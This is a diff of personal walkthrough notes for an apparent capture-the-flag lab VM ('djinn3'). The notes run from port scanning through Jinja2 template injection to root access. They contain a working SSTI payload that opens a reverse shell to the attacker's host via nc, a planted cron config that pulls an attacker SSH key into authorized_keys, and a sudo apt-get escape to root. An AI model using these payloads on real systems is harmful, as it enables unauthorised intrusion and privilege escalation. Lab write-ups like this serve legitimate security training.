@@ -1,115 +1,241 @@
-└─$ nmap -p- 172.16.33.29 
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 21:01 EDT
-Nmap scan report for 172.16.33.29
-Host is up (0.033s latency).
-Not shown: 65531 closed tcp ports (conn-refused)
-PORT      STATE SERVICE
-22/tcp    open  ssh
-80/tcp    open  http
-5000/tcp  open  upnp
-31337/tcp open  Elite
+//port scanning
+  └─$ nmap -p- 172.16.33.29 
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 21:01 EDT
+  Nmap scan report for 172.16.33.29
+  Host is up (0.033s latency).
+  Not shown: 65531 closed tcp ports (conn-refused)
+  PORT      STATE SERVICE
+  22/tcp    open  ssh
+  80/tcp    open  http
+  5000/tcp  open  upnp
+  31337/tcp open  Elite
+  
+  Nmap done: 1 IP address (1 host up) scanned in 27.33 seconds
+                                                                                                          
+  ┌──(kali㉿kali)-[~]
+  └─$ nc 172.16.33.29 31337                 
+  username> elite
+  password> 123456
+  authentication failed
+                                                                                                          
+  ┌──(kali㉿kali)-[~]
+  └─$ nmap -sV -A 172.16.33.29 80 5000 31337
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 21:03 EDT
+  Nmap scan report for 172.16.33.29
+  Host is up (0.033s latency).
+  Not shown: 996 closed tcp ports (conn-refused)
+  PORT      STATE SERVICE VERSION
+  22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+  | ssh-hostkey: 
+  |   2048 e6:44:23:ac:b2:d9:82:e7:90:58:15:5e:40:23:ed:65 (RSA)
+  |   256 ae:04:85:6e:cb:10:4f:55:4a:ad:96:9e:f2:ce:18:4f (ECDSA)
+  |_  256 f7:08:56:19:97:b5:03:10:18:66:7e:7d:2e:0a:47:42 (ED25519)
+  80/tcp    open  http    lighttpd 1.4.45
+  |_http-server-header: lighttpd/1.4.45
+  |_http-title: Custom-ers
+  5000/tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
+  |_http-title: Site doesn't have a title (text/html; charset=utf-8).
+  |_http-server-header: Werkzeug/1.0.1 Python/3.6.9
+  31337/tcp open  Elite?
+  | fingerprint-strings: 
+  |   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL: 
+  
+  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  Nmap done: 4 IP addresses (1 host up) scanned in 68.50 seconds
 
-Nmap done: 1 IP address (1 host up) scanned in 27.33 seconds
-                                                                                                        
-┌──(kali㉿kali)-[~]
-└─$ nc 172.16.33.29 31337                 
-username> elite
-password> 123456
-authentication failed
-                                                                                                        
-┌──(kali㉿kali)-[~]
-└─$ nmap -sV -A 172.16.33.29 80 5000 31337
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 21:03 EDT
-Nmap scan report for 172.16.33.29
-Host is up (0.033s latency).
-Not shown: 996 closed tcp ports (conn-refused)
-PORT      STATE SERVICE VERSION
-22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 e6:44:23:ac:b2:d9:82:e7:90:58:15:5e:40:23:ed:65 (RSA)
-|   256 ae:04:85:6e:cb:10:4f:55:4a:ad:96:9e:f2:ce:18:4f (ECDSA)
-|_  256 f7:08:56:19:97:b5:03:10:18:66:7e:7d:2e:0a:47:42 (ED25519)
-80/tcp    open  http    lighttpd 1.4.45
-|_http-server-header: lighttpd/1.4.45
-|_http-title: Custom-ers
-5000/tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
-|_http-title: Site doesn't have a title (text/html; charset=utf-8).
-|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
-31337/tcp open  Elite?
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL: 
-|     username>
-|   GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
-|     username> password> authentication failed
-|   Help: 
-|     username> password>
-|   RPCCheck: 
-|     username> Traceback (most recent call last):
-|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
-|     main()
-|     File "/opt/.tick-serv/tickets.py", line 93, in main
-|     username = input("username> ")
-|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
-|     (result, consumed) = self._buffer_decode(data, self.errors, final)
-|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte
-|   SSLSessionReq: 
-|     username> Traceback (most recent call last):
-|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
-|     main()
-|     File "/opt/.tick-serv/tickets.py", line 93, in main
-|     username = input("username> ")
-|     File "/usr/li5000b/python3.6/codecs.py", line 321, in decode
-|     (result, consumed) = self._buffer_decode(data, self.errors, final)
-|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd7 in position 13: invalid continuation byte
-|   TerminalServerCookie: 
-|     username> Traceback (most recent call last):
-|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
-|     main()
-|     File "/opt/.tick-serv/tickets.py", line 93, in main
-|     username = input("username> ")
-|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
-|     (result, consumed) = self._buffer_decode(data, self.errors, final)
-|_    UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe0 in position 5: invalid continuation byte
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port31337-TCP:V=7.94SVN%I=7%D=7/2%Time=6684A362%P=x86_64-pc-linux-gnu%r
-SF:(NULL,A,"username>\x20")%r(GetRequest,2A,"username>\x20password>\x20aut
-SF:hentication\x20failed\n")%r(SIPOptions,2A,"username>\x20password>\x20au
-SF:thentication\x20failed\n")%r(GenericLines,2A,"username>\x20password>\x2
-SF:0authentication\x20failed\n")%r(HTTPOptions,2A,"username>\x20password>\
-SF:x20authentication\x20failed\n")%r(RTSPRequest,2A,"username>\x20password
-SF:>\x20authentication\x20failed\n")%r(RPCCheck,1A9,"username>\x20Tracebac
-SF:k\x20\(most\x20recent\x20call\x20last\):\n\x20\x20File\x20\"/opt/\.tick
-SF:-serv/tickets\.py\",\x20line\x20105,\x20in\x20<module>\n\x20\x20\x20\x2
-SF:0main\(\)\n\x20\x20File\x20\"/opt/\.tick-serv/tickets\.py\",\x20line\x2
-SF:093,\x20in\x20main\n\x20\x20\x20\x20username\x20=\x20input\(\"username>
-SF:\x20\"\)\n\x20\x20File\x20\"/usr/lib/python3\.6/codecs\.py\",\x20line\x
-SF:20321,\x20in\x20decode\n\x20\x20\x20\x20\(result,\x20consumed\)\x20=\x2
-SF:0self\._buffer_decode\(data,\x20self\.errors,\x20final\)\nUnicodeDecode
-SF:Error:\x20'utf-8'\x20codec\x20can't\x20decode\x20byte\x200x80\x20in\x20
-SF:position\x200:\x20invalid\x20start\x20byte\n")%r(DNSVersionBindReqTCP,A
-SF:,"username>\x20")%r(DNSStatusRequestTCP,A,"username>\x20")%r(Help,14,"u
-SF:sername>\x20password>\x20")%r(SSLSessionReq,1B1,"username>\x20Traceback
-SF:\x20\(most\x20recent\x20call\x20last\):\n\x20\x20File\x20\"/opt/\.tick-
-SF:serv/tickets\.py\",\x20line\x20105,\x20in\x20<module>\n\x20\x20\x20\x20
-SF:main\(\)\n\x20\x20File\x20\"/opt/\.tick-serv/tickets\.py\",\x20line\x20
-SF:93,\x20in\x20main\n\x20\x20\x20\x20username\x20=\x20input\(\"username>\
-SF:x20\"\)\n\x20\x20File\x20\"/usr/lib/python3\.6/codecs\.py\",\x20line\x2
-SF:0321,\x20in\x20decode\n\x20\x20\x20\x20\(result,\x20consumed\)\x20=\x20
-SF:self\._buffer_decode\(data,\x20self\.errors,\x20final\)\nUnicodeDecodeE
-SF:rror:\x20'utf-8'\x20codec\x20can't\x20decode\x20byte\x200xd7\x20in\x20p
-SF:osition\x2013:\x20invalid\x20continuation\x20byte\n")%r(TerminalServerC
-SF:ookie,1B0,"username>\x20Traceback\x20\(most\x20recent\x20call\x20last\)
-SF::\n\x20\x20File\x20\"/opt/\.tick-serv/tickets\.py\",\x20line\x20105,\x2
-SF:0in\x20<module>\n\x20\x20\x20\x20main\(\)\n\x20\x20File\x20\"/opt/\.tic
-SF:k-serv/tickets\.py\",\x20line\x2093,\x20in\x20main\n\x20\x20\x20\x20use
-SF:rname\x20=\x20input\(\"username>\x20\"\)\n\x20\x20File\x20\"/usr/lib/py
-SF:thon3\.6/codecs\.py\",\x20line\x20321,\x20in\x20decode\n\x20\x20\x20\x2
-SF:0\(result,\x20consumed\)\x20=\x20self\._buffer_decode\(data,\x20self\.e
-SF:rrors,\x20final\)\nUnicodeDecodeError:\x20'utf-8'\x20codec\x20can't\x20
-SF:decode\x20byte\x200xe0\x20in\x20position\x205:\x20invalid\x20continuati
-SF:on\x20byte\n");
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+//80 port is a normal web page, 5000 is a page of tickets, nc to connect 31337 is a cli service to login
+    //port 31337    
+      ─$ nc -nv 192.168.56.114 31337                                 
+      (UNKNOWN) [192.168.56.114] 31337 (?) open
+      username> 
+    //some info from 5000, default user "guest"
+       <tr>
+                    <th scope="row">1</th>
+                    <td>2792</td>
+                    <td>Add authentication to the ticket managment system.</td>
+                    <td>open</td>
+                    <td><a href="/?id=2792">link</td>
+                </tr>
+                
+                <tr>
+                    <th scope="row">2</th>
+                    <td>4567</td>
+                    <td>Remove default user guest from the ticket creation service.</td>
+                    <td>open</td>
+                    <td><a href="/?id=4567">link</td>
+    //try this account with guest as passwd on 31337
+      └─$ nc -nv 192.168.56.114 31337        
+        (UNKNOWN) [192.168.56.114] 31337 (?) open
+        username> guest
+        password> guest
+        
+        Welcome to our own ticketing system. This application is still under 
+        development so if you find any issue please report it to mail@mzfr.me
+        
+        Enter "help" to get the list of available commands.
+        >  help
+            help        Show this menu
+            update      Update the ticketing software
+            open        Open a new ticket
+            close       Close an existing ticket
+            exit        Exit
+        > update
+        You are not authorized to update the system
+        Contact the system administrator for this
+        > open
+        Title: new
+        Description: ee
+    // we can create new ticket and view it in 5000 page
+└─$ curl -s http://192.168.56.114:5000 | html2text
+      **** This ticketing software is under development, if you find any issue please
+      report it to admin ****
+      #  ID   Title                                              Status      Link
+      1  2792 Add authentication to the ticket managment system. open        link
+      2  4567 Remove default user guest from the ticket creation open        link
+              service.
+      3  8345 Error while updating postgres queries              In progress link
+      4  7723 Jack will temporarily handling the risk limit UI   open        link
+      5  2984 Update the user information                        In progress link
+      6  2973 Complete the honeypot project                      In progress link
+      7  2209 1                                                  open        link
+      8  3004 1                                                  open        link
+      9  1997 ../../../../etc/passwd                             open        link
+      10 3655 <>                                                 open        link
+//it seems server side template injection SSTI, https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
+//so test SSTI first, if so, test the template. we found python 
+    {{7*'7'}} , 
+    └─$ curl -s http://192.168.56.114:5000?id=3323 | html2text
+      *** 64 ***
+      
+      Status: open
+      ID: 3323
+      *** Description: ***
+      
+      49
+      Sorry for the bright page, we are working on some beautiful CSS
+  //as a result, the template is jinja2, some payloads need to exploit
+    https://github.com/payloadbox/ssti-payloads
+  // we use, 
+      Title: f
+      Description: {{ cycler.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.105 8888 >/tmp/f').read() }}
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 4 IP addresses (1 host up) scanned in 68.50 seconds
+  //then listening on my host
+    └─$ nc -nvlp 8888              
+    listening on [any] 8888 ...
+    connect to [192.168.56.105] from (UNKNOWN) [192.168.56.114] 37386
+    /bin/sh: 0: can't access tty; job control turned off
+    $ id
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    $ $ pwd
+    /opt/.web
+    $ cd ..
+    $ ls
+    $ ls -la
+    total 24
+    drwxr-xr-x  4 root     root     4096 Jun  4  2020 .
+    drwxr-xr-x 23 root     root     4096 Jun  1  2020 ..
+    -rwxr-xr-x  1 saint    saint    1403 Jun  4  2020 .configuration.cpython-38.pyc
+    -rwxr-xr-x  1 saint    saint     661 Jun  4  2020 .syncer.cpython-38.pyc
+    drwxr-xr-x  2 www-data www-data 4096 May 17  2020 .tick-serv
+    drwxr-xr-x  4 www-data www-data 4096 Jun  4  2020 .web
+
+//the file configuration.cpython-38.pyc and .syncer.cpython-38.pyc is python file after compiling
+//tool uncompyle6 help to read the file
+    ─$ uncompyle6 .syncer.cpython-38.pyc
+      from configuration import *
+      from connectors.ftpconn import *
+      from connectors.sshconn import *
+      from connectors.utils import *
+      
+      def main():
+          """Main function
+          Cron job is going to make my work easy peasy
+          """
+          configPath = ConfigReader.set_config_path()
+          config = ConfigReader.read_config(configPath)
+          connections = checker(config)
+          if "FTP" in connections:
+              ftpcon(config["FTP"])
+          else:
+              if "SSH" in connections:
+                  sshcon(config["SSH"])
+              else:
+                  if "URL" in connections:
+                      sync(config["URL"], config["Output"])
+      
+      
+      if __name__ == "__main__":
+          main()
+      
+      # okay decompiling .syncer.cpython-38.pyc
+//we use pspy to check any cron job to run this /py script
+     ./pspy64
+    pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+    
+    
+         ██▓███    ██████  ██▓███ ▓██   ██▓
+        ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+        ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+        ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+        ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+        ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+        ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+        ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                       ░           ░ ░     
+                                   ░ ░     
+    
+    Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+    Draining file system events due to startup...
+    done
+    2025/01/22 13:31:22 CMD: UID=33    PID=6183   | ./pspy64 
+    2025/01/22 13:31:22 CMD: UID=0     PID=6182   | 
+    2025/01/22 13:31:22 CMD: UID=0     PID=6176   | 
+    2025/01/22 13:33:01 CMD: UID=1000  PID=6196   | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py                                                                                    
+    2025/01/22 13:33:01 CMD: UID=1000  PID=6195   | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py                                                                                    
+    2025/01/22 13:33:01 CMD: UID=0     PID=6194   | /usr/sbin/CRON -f 
+    2025/01/22 13:33:01 CMD: UID=1000  PID=6208   | 
+    2025/01/22 13:33:01 CMD: UID=1000  PID=6207   | /bin/sh -c uname -p 2> /dev/null 
+                                   
+// we have found: the file syncer.py 3 times/min, the file is read all json file under /tmp and saint's dir,
+// read the json file url file and output to a dir.
+// so we can write file to saint's home dir. lets create a json file:21-01-2025.config.json, and put it into target :/tmp
+  └─$ cat 21-01-2025.config.json 
+    {
+        "URL": "http://192.168.56.105:8821/id_rsa.pub",
+        "Output": "/home/saint/.ssh/authorized_keys"
+    }
+//at the same time, generate rsa pub and pri keys, and listening on this path for target to read it
+  ─$ ssh-keygen -t rsa
+
+  └─$ python3 -m http.server 8821
+    Serving HTTP on 0.0.0.0 port 8821 (http://0.0.0.0:8821/) ...
+    192.168.56.114 - - [22/Jan/2025 00:33:14] "GET /id_rsa.pub HTTP/1.1" 200 -
+//now we can ssh target host by using saint
+  ─$ ssh saint@192.168.56.114 -i id_rsa
+    Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+    saint@djinn3:~$ sudo -l
+    Matching Defaults entries for saint on djinn3:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+    
+    User saint may run the following commands on djinn3:
+        (root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin
+// we can see, saint can run adduser to add users. but cannot read sudoers file
+    saint@djinn3:~$ cat /etc/sudoers
+    cat: /etc/sudoers: Permission denied
+// so we add a new user like ed with --gid 0 to read teh sudoers file
+    ed@djinn3:/home/saint$ cat /etc/sudoers
+        # See sudoers(5) for more information on "#include" directives:
+# If you need a huge list of used numbers please install the nmap package.
+
+    saint ALL=(root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin
+    
+    jason ALL=(root) PASSWD: /usr/bin/apt-get
+//jason has the privi to run apt-get, but not in /etc/passwd, lets add jason
+    jason@djinn3:/home/saint$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+    [sudo] password for jason: 
+    # id
+    uid=0(root) gid=0(root) groups=0(root)
+
+
+
 
